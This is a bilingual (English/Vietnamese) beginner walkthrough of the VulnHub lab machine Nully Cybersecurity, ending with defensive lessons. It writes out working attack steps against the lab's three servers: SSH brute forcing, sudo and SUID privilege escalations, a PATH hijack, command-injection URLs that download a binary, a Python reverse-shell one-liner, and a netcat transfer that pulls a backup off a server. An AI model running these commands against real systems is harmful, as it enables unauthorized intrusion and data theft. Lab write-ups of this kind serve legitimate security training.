---
layout: post
title: "Nully Cybersecurity (VulnHub): a beginner's walkthrough"
date: 2026-03-08
author: Nguyen Nam Khanh
tags: [vulnhub, walkthrough, pentest, privilege-escalation, pivoting]
description: >
  A full, beginner-friendly walkthrough of the Nully Cybersecurity VulnHub
  machine: from an unauthenticated port scan to root on three separate servers,
  pivoting through an internal Docker network along the way.
---

<style>
.lang-switch{display:inline-flex;border:1px solid #d0d7de;border-radius:8px;overflow:hidden;margin:0 0 2rem}
.lang-switch button{appearance:none;-webkit-appearance:none;border:0;background:#fff;color:#57606a;font:inherit;font-size:.9rem;line-height:1;padding:.5rem 1rem;cursor:pointer;transition:background .12s,color .12s}
.lang-switch button+button{border-left:1px solid #d0d7de}
.lang-switch button:hover{background:#f6f8fa}
.lang-switch button.active{background:#0969da;color:#fff}
.lang-switch button.active:hover{background:#0860ca}
.lang-vi{display:none}
body.wlang-vi .lang-en{display:none}
body.wlang-vi .lang-vi{display:block}
</style>

<div class="lang-switch" role="group" aria-label="Language / Ngôn ngữ">
  <button type="button" id="wl-en" class="active" onclick="setWLang('en')">English</button>
  <button type="button" id="wl-vi" onclick="setWLang('vi')">Tiếng Việt</button>
</div>

<div class="lang-en" markdown="1">

> Lab use only. Everything below runs against Nully Cybersecurity: 1, an
> intentionally vulnerable virtual machine on my own isolated network. Never run
> these techniques against a system you do not own or do not have written
> permission to test.

If you are just getting into penetration testing, a boot-to-root machine is one of
the best ways to learn. You start with nothing but an IP address and work your way
up to full administrator (`root`) access. This box is a good one to start with,
because it is not a single puzzle. It is three machines chained together, and you
have to pivot from one to the next.

By the end you will have touched almost every stage of a real engagement: recon,
reading a mail server, password cracking, command injection, reverse shells,
network pivoting, and four or five different privilege-escalation tricks.

---

## Reproduce this at home

You can download the exact machine and follow along step by step.

| | |
|---|---|
| Machine | Nully Cybersecurity: 1 |
| Author | laf3r |
| Source | [VulnHub entry](https://www.vulnhub.com/entry/nully-cybersecurity-1,549/) |
| Released | 6 September 2020 |
| Difficulty | Easy to intermediate |
| Format | VirtualBox OVA (~1.4 GB), `NullyCybersecurityCTF.zip` |

Setup I used:

1. Download the OVA from the VulnHub page and import it into VirtualBox (the
   author notes it runs better on VirtualBox than VMware). Check the download
   against the MD5/SHA1 checksums on the VulnHub page before you import.
2. Put the target on a Host-Only adapter so it can reach only your attacker VM,
   not the internet. That keeps the lab safe and the scan results clean.
3. Run a Kali (or any Linux) attacker VM on the same host-only network.

> Throughout this write-up the target first shows up at `192.168.1.46`. Your IP
> will differ, so substitute your own wherever you see it. This box was built in
> two sittings, so a couple of internal IPs shift partway through, and I call that
> out where it happens.

---

## Flag 1: the mail server

### Find the target

I do not know the machine's IP yet, so I sweep the local network with
`netdiscover`, which sends ARP requests and lists every host that answers:

```bash
netdiscover -i eth1 -r 192.168.1.0/24
```

One host stands out at `192.168.1.46`, and its MAC address belongs to PCS
Systemtechnik GmbH, the vendor ID VirtualBox uses. That is the box.

### Scan it

`nmap` tells me which services are running. `-sC` runs the safe default scripts,
`-sV` grabs version banners, `-v` is verbose:

```bash
nmap -sC -sV 192.168.1.46 -v
```

![nmap results showing five open ports]({{ '/images/nully-cybersecurity/01-nmap.png' | relative_url }})

Five ports are open:

| Port | Service |
|---|---|
| 80 | HTTP (web) |
| 110 | POP3 (email) |
| 2222 | SSH |
| 8000 | HTTP (another web app) |
| 9000 | (used later) |

The website on port 80 hints that only POP3 (110) and SSH (2222) are meant to be
attacked from outside, and it hands me a set of mailbox credentials.

### Read the mail over POP3

POP3 is an old, plain-text email protocol, so I can talk to it by hand with
`telnet`. `USER` and `PASS` log in, `LIST` shows waiting messages, and `RETR 1`
reads the first one:

```bash
telnet 192.168.1.46 110
USER pentester
PASS qKnGByeaeQJWTjj2efHxst7Hu0xHADGO
LIST
RETR 1
```

![Reading Bob's email over POP3]({{ '/images/nully-cybersecurity/02-pop3-mail.png' | relative_url }})

There is one message, from the mail-server admin Bob Smith, and he admits his
password is simple. That is a strong hint. Admins often reuse their own name, and
a weak password invites brute force.

### Brute-force SSH as Bob

I build a small wordlist of names tied to Bob (`username.txt`) and let `hydra` try
each entry as both the username and the password against SSH on port 2222. `-f`
stops at the first hit:

```bash
hydra -L username.txt -P username.txt -f ssh://192.168.1.46:2222
```

It lands on `bob` / `bobby1985`.

![hydra finds bob's SSH password]({{ '/images/nully-cybersecurity/03-hydra-ssh.png' | relative_url }})

```bash
ssh bob@192.168.1.46 -p 2222
```

### From Bob to root

The first thing to check after you land on any Linux box is what the user may run
as someone else:

```bash
sudo -l
```

Bob can run `/opt/scripts/check.sh` as the user `my2user`. That script is
writable, so I append a line that launches a shell (`/bin/bash`) and run it, a
classic step sideways into another account:

```bash
sudo -u my2user /bin/bash /opt/scripts/check.sh
```

![Shell as my2user]({{ '/images/nully-cybersecurity/04-shell-my2user.png' | relative_url }})

Now, as `my2user`, I check `sudo -l` again. This user can run `zip` as root
without a password. `zip` is on [GTFOBins](https://gtfobins.github.io/gtfobins/zip/#sudo),
which documents how everyday binaries get abused. The trick:

```bash
TF=$(mktemp -u)
sudo zip $TF /etc/hosts -T -TT 'sh #'
```

Why it works, in plain terms:

- `zip` is allowed to run as root, so anything it launches also runs as root.
- `-T` tells `zip` to test the archive after it builds it.
- `-TT 'sh #'` replaces the normal test command with my own. `zip` runs `sh`, a
  root shell, and the `#` comments out the rest of the line.

That gives me a root shell on the mail server, and Flag 1.

---

## Flag 2: pivoting to the web server

Root on one machine is rarely the whole story. This box lives inside an internal
Docker network (`172.17.0.0/16`) that I can see only from the mail server.
Reaching those hidden machines is called pivoting. First I drop an SSH key on the
mail server as a stable way back in, then explore.

### Map the internal network

From the mail server I scan the internal range with `netdiscover`:

```bash
netdiscover -i eth0 -r 172.17.0.0/16
```

`172.17.0.1` is the gateway. Probing the rest:

- `172.17.0.3` has port 80 open, a web server (confirmed with `curl`).
- `172.17.0.2` has port 21 open, an FTP file server (used in Flag 3).

### Tunnel the hidden web app to my machine

My attacker laptop cannot reach `172.17.0.x` directly, so I build an SSH tunnel
(local port forward) through the mail server. That makes the remote web server
show up as `localhost:8000` on my own machine:

```bash
ssh -L 8000:172.17.0.3:80 root@192.168.1.46 -p 2222 -i id_rsa
```

![Local port forward established]({{ '/images/nully-cybersecurity/05-ssh-tunnel.png' | relative_url }})

Now `http://localhost:8000` is the internal web server.

### Find the vulnerable page

`dirb` brute-forces common file and directory names to find hidden pages:

```bash
dirb http://localhost:8000
```

It turns up a listable `/ping/` directory with `ping.php` inside. A note on the
page says to use a `host` parameter, and it runs that value without checking it:

```
http://localhost:8000/ping/ping.php?host=172.17.0.1
```

![ping.php reflects command output (command injection)]({{ '/images/nully-cybersecurity/06-ping-command-injection.png' | relative_url }})

That is a textbook OS command injection: whatever I append after a `;` runs on the
server.

### Get a shell as www-data

First I stage a `netcat` binary onto the target through the injection. The
low-privileged web user cannot install packages, so I `wget` a copy I host myself:

```
http://localhost:8000/ping/ping.php?host=; wget http://172.17.0.5:9000/nc
http://localhost:8000/ping/ping.php?host=; chmod 777 nc
```

The `nc` reverse shell did not fire, because this build lacks the `-e` option, so
I fall back to a Python one-liner. It connects back to a listener I run on the
mail server, my pivot box, at `172.17.0.5:9000`:

```python
python3 -c 'import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("172.17.0.5",9000));
os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);
subprocess.call(["/bin/sh","-i"])'
```

What each part does: create a network socket, connect it back to my listener, wire
the shell's input, output and errors (`0`, `1`, `2`) into that socket, then launch
an interactive shell.

> IP note: after a VM reboot the internal addresses shifted. At this point
> `172.17.0.5` is the mail server (my listener), `172.17.0.2` is the file server,
> and `172.17.0.3` is the web server. Adjust to whatever your own `netdiscover`
> shows.

![Reverse shell as www-data]({{ '/images/nully-cybersecurity/07-reverse-shell.png' | relative_url }})

I land as the low-privileged `www-data`.

### Two users, two escalations

Hunting for files owned by the interesting users turns up two leads:

```bash
find / -type f -user 1000 2>/dev/null   # Oscar
find / -type f -user 1001 2>/dev/null   # Oliver
```

Oliver left a `.secret` backup file with his password inside
(`4hppfvhb9pW4E4OrbMLwPETRgVo2KyyDTqGF`), so I log in as Oliver.

Oscar owns a SUID `python3`, a program that always runs as its owner. Run it with
the privileged flag and it keeps Oscar's identity instead of dropping it:

```bash
python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

The `-p` means privileged mode: do not drop the elevated rights. From Oscar's home
I recover his password (`H53QfJcXNcur9xFGND3bkPlVlMYUrPyBp76o`) and SSH in as Oscar
properly.

### Root via a PATH hijack

Oscar's home has a `/scripts` folder with a SUID-root program called
`current-date`. SUID-root means it always runs as root, no matter who starts it. I
read its strings:

```bash
strings current-date
```

![strings output of current-date]({{ '/images/nully-cybersecurity/08-strings-current-date.png' | relative_url }})

It calls `date` without a full path, not `/bin/date`. So the system searches the
folders in `$PATH` to find `date`, and I control `$PATH`. I plant a fake `date`
that opens a root-preserving shell, put its folder first in `$PATH`, and run
`current-date`:

```bash
cd /tmp
printf '#!/bin/bash\n/bin/bash -p\n' > date
chmod +x date
export PATH=/tmp:$PATH
current-date
```

The `-p` matters: a normal `bash` drops SUID privileges on launch, so without it
you fall back to your own user. With `-p`, the shell keeps the root rights it
inherited from the SUID `current-date`.

> The original report did this same PATH hijack but kept the exact commands in
> screenshots. The block above is the standard, working form of the technique.

![Root on the web server, 2_flag.txt]({{ '/images/nully-cybersecurity/09-root-web-server.png' | relative_url }})

I own the web server now, and `2_flag.txt` is mine.

---

## Flag 3: the file server and the database server

### Loot the file server over anonymous FTP

From the web server I can reach the file server at `172.17.0.2`, which allows
anonymous FTP: log in with the username `anonymous` and no password.

![Anonymous FTP enabled]({{ '/images/nully-cybersecurity/10-anonymous-ftp.png' | relative_url }})

Inside are `file.txt` (nothing useful) and `backup.zip`. I move the archive back
to my own machine with `netcat` so it is easier to work on:

```bash
# on the remote server
nc -w 3 192.168.18.145 8888 < backup.zip
# on my machine
nc -lvnp 8888 > backup.zip
```

### Crack the archive password

The zip is encrypted. `zip2john` turns it into a hash that `john` (John the
Ripper) can crack:

```bash
zip2john backup.zip > zip.hash
john zip.hash
```

The password is `1234567890`.

![john cracks the zip password]({{ '/images/nully-cybersecurity/11-john-zip-crack.png' | relative_url }})

Inside are credentials for a user, donald, who has access to the database server. I
SSH to it from the web server.

### Root via the screen exploit

On the database server, `linpeas` (an automated privilege-escalation scanner)
flags a SUID binary, `screen-4.5.0`. That exact version has a known local-root
exploit, [Exploit-DB 41154](https://www.exploit-db.com/raw/41154).

In short: `screen` runs as root, and this version mishandles its log-file option,
so it can be tricked into loading an attacker-supplied shared library as root. The
published exploit is a self-contained shell script. It writes and compiles two
small helper files, a library and a tiny root-shell program, then launches
`screen` so the library loads with root privileges:

```bash
# save Exploit-DB 41154 as 41154.sh, then:
chmod +x 41154.sh
./41154.sh
# -> drops you into a root shell
```

![Root on the database server]({{ '/images/nully-cybersecurity/12-root-db-server.png' | relative_url }})

That gives me root on the database server and the last flag. All three servers
owned.

---

## What this box teaches

If you write this up for a portfolio, the value is not the flags. It is showing
that you understand why each step worked and how a defender stops it.

The first door was a weak, guessable password (`bobby1985`). Enforce strong,
unique passwords and rate-limit SSH, and that door stays shut. The jump from Bob
to the next account came from a writable script run through `sudo`, so never let a
user edit a script they can run as someone else. The two root shells, on the mail
server and the database server, came from binaries that should never have had
those rights: `zip` in `sudoers` and an outdated SUID `screen 4.5.0`. Grant the
narrowest `sudo` rights you can, check every allowed binary against GTFOBins, patch
old software, and drop the SUID bit where nothing needs it.

The web server fell to two more everyday mistakes. `ping.php` passed user input
straight to the shell, so build shell commands with safe APIs and allow-lists,
never from raw input. `current-date` called a binary by name instead of its full
path, so always use absolute paths and reset `$PATH` in privileged programs. The
file server handed over a backup over anonymous FTP, protected only by the
password `1234567890`, so turn off anonymous access and treat backup archives as
the sensitive files they are.

One weak password at the edge turned into full control of an entire internal
network, because each machine trusted the one before it.

---

*Written by Nguyen Nam Khanh ([@Khanh1916](https://github.com/Khanh1916)).*

</div>

<div class="lang-vi" markdown="1">

> Chỉ dùng trong lab. Mọi thứ bên dưới mình làm trên Nully Cybersecurity: 1, một
> máy ảo cố ý cài lỗ hổng, chạy trong mạng cô lập của riêng mình. Đừng bao giờ áp
> dụng những kỹ thuật này lên hệ thống bạn không sở hữu hoặc chưa có văn bản cho
> phép kiểm thử.

Nếu bạn vừa chân ướt chân ráo bước vào penetration testing, một máy dạng
boot-to-root là một trong những cách học tốt nhất. Bạn khởi đầu trong tay chỉ có
mỗi một địa chỉ IP, rồi từng bước leo lên quyền quản trị cao nhất (`root`). Đây là
một máy đáng để mở hàng, vì nó không phải một câu đố đơn lẻ. Nó là ba máy nối
chuỗi với nhau, và bạn buộc phải pivot (bắc cầu) từ máy này sang máy kế tiếp.

Đi hết bài này, bạn sẽ chạm tay vào gần như mọi công đoạn của một kỳ đánh giá thực
tế: recon, đọc mail server, crack mật khẩu, command injection, reverse shell,
pivot mạng, cùng bốn năm chiêu leo quyền khác nhau.

---

## Dựng lại ngay tại nhà

Bạn tải đúng máy ảo này về rồi làm theo từng bước được.

| | |
|---|---|
| Máy | Nully Cybersecurity: 1 |
| Tác giả | laf3r |
| Nguồn | [Trang VulnHub](https://www.vulnhub.com/entry/nully-cybersecurity-1,549/) |
| Phát hành | 6/9/2020 |
| Độ khó | Dễ đến trung bình |
| Định dạng | VirtualBox OVA (~1.4 GB), `NullyCybersecurityCTF.zip` |

Cấu hình mình dùng:

1. Tải OVA từ trang VulnHub rồi import vào VirtualBox (tác giả có lưu ý nó chạy
   mượt trên VirtualBox hơn VMware). Trước khi import, nhớ đối chiếu file tải về
   với checksum MD5/SHA1 ghi trên trang VulnHub.
2. Gắn máy mục tiêu vào card mạng Host-Only để nó chỉ nói chuyện được với máy tấn
   công của bạn, không ra nổi internet. Làm vậy vừa giữ lab an toàn, vừa cho kết
   quả quét sạch sẽ.
3. Chạy một máy tấn công Kali (hay Linux bất kỳ) trong cùng mạng host-only đó.

> Xuyên suốt bài, mục tiêu lần đầu xuất hiện ở `192.168.1.46`. IP của bạn chắc
> chắn khác, nên thấy ở đâu thì thay bằng IP của bạn. Máy này được dựng làm hai
> lần khác nhau, nên vài IP nội bộ có đổi chỗ giữa chừng, mình sẽ nhắc ngay tại
> chỗ nó xảy ra.

---

## Flag 1: mail server

### Tìm mục tiêu

Mình chưa biết IP của máy, nên rà mạng nội bộ bằng `netdiscover`, công cụ bắn ra
các gói ARP rồi liệt kê mọi host chịu trả lời:

```bash
netdiscover -i eth1 -r 192.168.1.0/24
```

Có một host nổi bật ở `192.168.1.46`, và địa chỉ MAC của nó thuộc về PCS
Systemtechnik GmbH, đúng mã nhà sản xuất mà VirtualBox hay dùng. Nó đây rồi.

### Quét cổng

`nmap` cho mình biết dịch vụ nào đang chạy. `-sC` chạy bộ script mặc định an toàn,
`-sV` lấy banner phiên bản, `-v` để in chi tiết:

```bash
nmap -sC -sV 192.168.1.46 -v
```

![Kết quả nmap với năm cổng mở]({{ '/images/nully-cybersecurity/01-nmap.png' | relative_url }})

Có năm cổng mở:

| Cổng | Dịch vụ |
|---|---|
| 80 | HTTP (web) |
| 110 | POP3 (email) |
| 2222 | SSH |
| 8000 | HTTP (một web app khác) |
| 9000 | (dùng ở phần sau) |

Trang web ở cổng 80 ngầm gợi ý rằng chỉ POP3 (110) và SSH (2222) mới là mục tiêu
được phép tấn công từ bên ngoài, và nó dúi luôn cho mình một bộ thông tin đăng
nhập hòm thư.

### Đọc mail qua POP3

POP3 là một giao thức email đời cũ, dạng văn bản thuần, nên mình nói chuyện tay bo
với nó bằng `telnet` được. `USER` và `PASS` để đăng nhập, `LIST` liệt kê thư đang
chờ, còn `RETR 1` đọc thư đầu tiên:

```bash
telnet 192.168.1.46 110
USER pentester
PASS qKnGByeaeQJWTjj2efHxst7Hu0xHADGO
LIST
RETR 1
```

![Đọc email của Bob qua POP3]({{ '/images/nully-cybersecurity/02-pop3-mail.png' | relative_url }})

Chỉ có đúng một thư, gửi từ quản trị mail server Bob Smith, và anh chàng tự thú
mật khẩu của mình đơn giản lắm. Đó là một gợi ý đậm: admin hay đặt mật khẩu theo
tên mình, mà mật khẩu yếu thì chẳng khác gì mời brute force vào nhà.

### Brute-force SSH bằng tài khoản Bob

Mình soạn một wordlist nhỏ gồm những cái tên dính dáng đến Bob (`username.txt`),
rồi để `hydra` thử từng mục vừa làm username vừa làm password nhắm vào SSH cổng
2222. `-f` dừng ngay khi trúng lần đầu:

```bash
hydra -L username.txt -P username.txt -f ssh://192.168.1.46:2222
```

Kết quả: `bob` / `bobby1985`.

![hydra tìm ra mật khẩu SSH của bob]({{ '/images/nully-cybersecurity/03-hydra-ssh.png' | relative_url }})

```bash
ssh bob@192.168.1.46 -p 2222
```

### Từ Bob leo lên root

Việc đầu tiên nên làm sau khi đặt chân lên bất kỳ máy Linux nào là xem user này
được phép chạy gì dưới danh nghĩa người khác:

```bash
sudo -l
```

Bob được phép chạy `/opt/scripts/check.sh` dưới tài khoản `my2user`. Mà cái script
đó lại ghi được, nên mình chèn thêm một dòng mở shell (`/bin/bash`) rồi chạy nó,
một bước đi ngang kinh điển để nhảy sang tài khoản khác:

```bash
sudo -u my2user /bin/bash /opt/scripts/check.sh
```

![Shell với quyền my2user]({{ '/images/nully-cybersecurity/04-shell-my2user.png' | relative_url }})

Giờ đã là `my2user`, mình lại chạy `sudo -l`. User này được chạy `zip` với quyền
root mà khỏi cần mật khẩu. `zip` có tên trong [GTFOBins](https://gtfobins.github.io/gtfobins/zip/#sudo),
nơi liệt kê cách biến các binary thường ngày thành công cụ leo quyền. Chiêu như
sau:

```bash
TF=$(mktemp -u)
sudo zip $TF /etc/hosts -T -TT 'sh #'
```

Vì sao nó ăn, nói cho dễ hiểu:

- `zip` được chạy với quyền root, nên bất cứ thứ gì nó khởi chạy cũng là root.
- `-T` bảo `zip` kiểm thử (test) cái archive sau khi tạo xong.
- `-TT 'sh #'` thay lệnh test mặc định bằng lệnh của mình. `zip` chạy `sh`, một
  shell root, còn dấu `#` biến phần còn lại của dòng thành chú thích.

Thế là mình có một shell root trên mail server, kèm Flag 1.

---

## Flag 2: pivot sang web server

Có root trên một máy hiếm khi là trọn vẹn câu chuyện. Máy này nằm trong một mạng
Docker nội bộ (`172.17.0.0/16`) mà mình chỉ nhìn thấy được từ mail server. Việc
luồn tới những máy ẩn đó gọi là pivoting. Trước hết, mình thả một khóa SSH lên mail
server làm đường quay lại ổn định, rồi mới dò xét.

### Vẽ bản đồ mạng nội bộ

Từ mail server, mình quét dải mạng nội bộ bằng `netdiscover`:

```bash
netdiscover -i eth0 -r 172.17.0.0/16
```

`172.17.0.1` là gateway. Dò tiếp mấy máy còn lại:

- `172.17.0.3` mở cổng 80, một web server (đã xác nhận bằng `curl`).
- `172.17.0.2` mở cổng 21, một file server FTP (dùng ở Flag 3).

### Dẫn web app ẩn về máy mình

Laptop tấn công của mình không với thẳng tới `172.17.0.x` được, nên mình dựng một
SSH tunnel (local port forward) luồn qua mail server. Nhờ vậy, web server ở xa
hiện ra ngay thành `localhost:8000` trên máy mình:

```bash
ssh -L 8000:172.17.0.3:80 root@192.168.1.46 -p 2222 -i id_rsa
```

![Đã dựng local port forward]({{ '/images/nully-cybersecurity/05-ssh-tunnel.png' | relative_url }})

Giờ `http://localhost:8000` chính là web server nội bộ.

### Tìm trang dính lỗi

`dirb` dò vét các tên file và thư mục phổ biến để lần ra trang ẩn:

```bash
dirb http://localhost:8000
```

Nó lòi ra thư mục `/ping/` liệt kê được, bên trong có `ping.php`. Một ghi chú trên
trang bảo dùng tham số `host`, và nó đem giá trị đó chạy thẳng, không kiểm tra gì:

```
http://localhost:8000/ping/ping.php?host=172.17.0.1
```

![ping.php phản chiếu output của lệnh (command injection)]({{ '/images/nully-cybersecurity/06-ping-command-injection.png' | relative_url }})

Đây chính là OS command injection kiểu sách giáo khoa: bất cứ thứ gì mình nối sau
dấu `;` đều chạy trên server.

### Lấy shell với quyền www-data

Trước tiên mình tuồn một binary `netcat` lên mục tiêu qua lỗ injection. Quyền web
user thì thấp, không cài gói được, nên mình `wget` một bản tự host lấy:

```
http://localhost:8000/ping/ping.php?host=; wget http://172.17.0.5:9000/nc
http://localhost:8000/ping/ping.php?host=; chmod 777 nc
```

Reverse shell bằng `nc` không nổ, vì bản build này thiếu tùy chọn `-e`, nên mình
chuyển sang một dòng Python. Nó kết nối ngược về listener mình chạy trên mail
server, chính là máy pivot của mình, tại `172.17.0.5:9000`:

```python
python3 -c 'import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("172.17.0.5",9000));
os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);
subprocess.call(["/bin/sh","-i"])'
```

Từng mảnh làm gì: tạo một socket mạng, kết nối ngược về listener của mình, đấu
input, output và lỗi của shell (`0`, `1`, `2`) vào socket đó, rồi bật một shell
tương tác.

> Lưu ý về IP: sau một lần reboot VM, các địa chỉ nội bộ bị đổi chỗ. Tại thời điểm
> này `172.17.0.5` là mail server (listener của mình), `172.17.0.2` là file
> server, còn `172.17.0.3` là web server. Hãy chỉnh theo đúng những gì
> `netdiscover` của bạn hiển thị.

![Reverse shell với quyền www-data]({{ '/images/nully-cybersecurity/07-reverse-shell.png' | relative_url }})

Mình vào được với quyền còm cõi của `www-data`.

### Hai user, hai đường leo quyền

Lùng các file thuộc sở hữu của mấy user đáng chú ý, mình ra được hai manh mối:

```bash
find / -type f -user 1000 2>/dev/null   # Oscar
find / -type f -user 1001 2>/dev/null   # Oliver
```

Oliver bỏ quên một file backup `.secret` chứa luôn mật khẩu của anh ta
(`4hppfvhb9pW4E4OrbMLwPETRgVo2KyyDTqGF`), nên mình đăng nhập thành Oliver.

Oscar thì sở hữu một `python3` có bit SUID, một chương trình luôn chạy dưới quyền
của chủ sở hữu. Chạy nó với cờ privileged thì nó giữ nguyên danh tính Oscar thay
vì buông ra:

```bash
python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

Cái `-p` nghĩa là chế độ privileged: không hạ cái quyền vừa nâng được. Từ thư mục
home của Oscar, mình moi ra mật khẩu của anh ta (`H53QfJcXNcur9xFGND3bkPlVlMYUrPyBp76o`)
rồi SSH vào đàng hoàng với tài khoản Oscar.

### Lên root bằng PATH hijack

Home của Oscar có một thư mục `/scripts` chứa chương trình SUID-root tên
`current-date`. SUID-root nghĩa là nó luôn chạy dưới quyền root, bất kể ai khởi
chạy. Mình soi các chuỗi nằm trong nó:

```bash
strings current-date
```

![Output strings của current-date]({{ '/images/nully-cybersecurity/08-strings-current-date.png' | relative_url }})

Nó gọi `date` mà không kèm đường dẫn đầy đủ, không phải `/bin/date`. Nghĩa là hệ
thống sẽ lần lượt tìm `date` trong các thư mục liệt kê ở `$PATH`, mà `$PATH` thì
nằm trong tay mình. Mình cắm vào một `date` giả, hễ chạy là mở ra shell giữ nguyên
quyền root, đẩy thư mục của nó lên đầu `$PATH`, rồi chạy `current-date`:

```bash
cd /tmp
printf '#!/bin/bash\n/bin/bash -p\n' > date
chmod +x date
export PATH=/tmp:$PATH
current-date
```

Cái `-p` ở đây mới là mấu chốt: một `bash` bình thường sẽ buông ngay quyền SUID
lúc khởi chạy, thiếu nó là bạn rớt về lại user của mình. Có `-p`, shell giữ nguyên
cái quyền root mà nó thừa hưởng từ `current-date` SUID.

> Báo cáo gốc cũng làm đúng kiểu PATH hijack này nhưng giữ các lệnh chính xác ở
> trong ảnh chụp. Khối lệnh trên là dạng chuẩn, chạy được, của kỹ thuật đó.

![Root trên web server, 2_flag.txt]({{ '/images/nully-cybersecurity/09-root-web-server.png' | relative_url }})

Giờ mình làm chủ web server, và `2_flag.txt` về tay.

---

## Flag 3: file server và database server

### Vét sạch file server qua FTP ẩn danh

Từ web server, mình với được tới file server ở `172.17.0.2`, nơi cho phép FTP ẩn
danh: đăng nhập bằng username `anonymous` và bỏ trống mật khẩu.

![FTP ẩn danh được bật]({{ '/images/nully-cybersecurity/10-anonymous-ftp.png' | relative_url }})

Bên trong có `file.txt` (chẳng được tích sự gì) và `backup.zip`. Mình kéo cái
archive về máy mình bằng `netcat` cho dễ bề xoay xở:

```bash
# trên server từ xa
nc -w 3 192.168.18.145 8888 < backup.zip
# trên máy mình
nc -lvnp 8888 > backup.zip
```

### Crack mật khẩu archive

File zip có mã hóa. `zip2john` biến nó thành một hash để `john` (John the Ripper)
đem đi crack:

```bash
zip2john backup.zip > zip.hash
john zip.hash
```

Mật khẩu là `1234567890`.

![john crack mật khẩu zip]({{ '/images/nully-cybersecurity/11-john-zip-crack.png' | relative_url }})

Bên trong là thông tin đăng nhập của một user tên donald, người có quyền truy cập
database server. Mình SSH sang đó ngay từ web server.

### Lên root bằng lỗ hổng screen

Trên database server, `linpeas` (công cụ tự động dò đường leo quyền) khoanh vùng
một binary SUID, `screen-4.5.0`. Đúng cái phiên bản này có một lỗ hổng local root
đã công bố, [Exploit-DB 41154](https://www.exploit-db.com/raw/41154).

Nói gọn: `screen` chạy dưới quyền root, và bản này xử lý ẩu tùy chọn log-file, nên
có thể bị lừa để nạp một shared library do kẻ tấn công cung cấp dưới quyền root.
Exploit được công bố là một shell script tự chứa. Nó tự viết và biên dịch hai file
phụ nhỏ, một library và một chương trình root-shell bé tẹo, rồi khởi chạy `screen`
để cái library được nạp với quyền root:

```bash
# lưu Exploit-DB 41154 thành 41154.sh, rồi:
chmod +x 41154.sh
./41154.sh
# -> thả bạn vào một shell root
```

![Root trên database server]({{ '/images/nully-cybersecurity/12-root-db-server.png' | relative_url }})

Thế là mình có root trên database server cùng flag cuối cùng. Cả ba server đều về
một mối.

---

## Máy này dạy được gì

Nếu bạn viết lại cho portfolio, giá trị không nằm ở mấy cái flag. Nó nằm ở chỗ cho
người đọc thấy bạn hiểu vì sao mỗi bước lại ăn, và một người phòng thủ chặn nó ra
sao.

Cánh cửa đầu tiên là một mật khẩu yếu, dễ đoán (`bobby1985`). Đặt mật khẩu mạnh,
duy nhất và giới hạn tần suất đăng nhập SSH thì cửa đó đóng lại. Bước nhảy từ Bob
sang tài khoản kế đến từ một script ghi được nhưng chạy qua `sudo`, nên đừng bao
giờ để user sửa được một script mà họ có quyền chạy dưới danh nghĩa người khác.
Hai shell root, trên mail server và database server, đến từ những binary lẽ ra
không nên có quyền đó: `zip` nằm trong `sudoers` và một `screen 4.5.0` SUID đã lỗi
thời. Hãy cấp quyền `sudo` hẹp hết mức có thể, soi mọi binary được phép đối chiếu
với GTFOBins, vá phần mềm cũ, và gỡ bit SUID ở chỗ không cần.

Web server ngã vì hai cái sai thường ngày nữa. `ping.php` đẩy thẳng input người
dùng vào shell, nên hãy dựng lệnh shell bằng API an toàn và allow-list, đừng dựng
từ input thô. `current-date` gọi một binary bằng tên thay vì đường dẫn đầy đủ, nên
luôn dùng đường dẫn tuyệt đối và reset `$PATH` trong các chương trình đặc quyền.
File server thì giao nộp một bản backup qua FTP ẩn danh, chỉ khóa bằng mật khẩu
`1234567890`, nên hãy tắt truy cập ẩn danh và coi mấy file backup đúng là tài liệu
nhạy cảm như bản chất của chúng.

Một mật khẩu yếu ngoài rìa rốt cuộc biến thành quyền kiểm soát trọn vẹn cả một
mạng nội bộ, chỉ vì máy nào cũng tin cái máy đứng ngay trước nó.

---

*Viết bởi Nguyễn Nam Khánh ([@Khanh1916](https://github.com/Khanh1916)).*

</div>

<script>
function setWLang(l){
  document.body.classList.toggle('wlang-vi', l === 'vi');
  var en = document.getElementById('wl-en'), vi = document.getElementById('wl-vi');
  if(en) en.classList.toggle('active', l === 'en');
  if(vi) vi.classList.toggle('active', l === 'vi');
  try { localStorage.setItem('writeups-lang', l); } catch(e){}
}
(function(){
  var saved = 'en';
  try { saved = localStorage.getItem('writeups-lang') || 'en'; } catch(e){}
  setWLang(saved);
})();
</script>
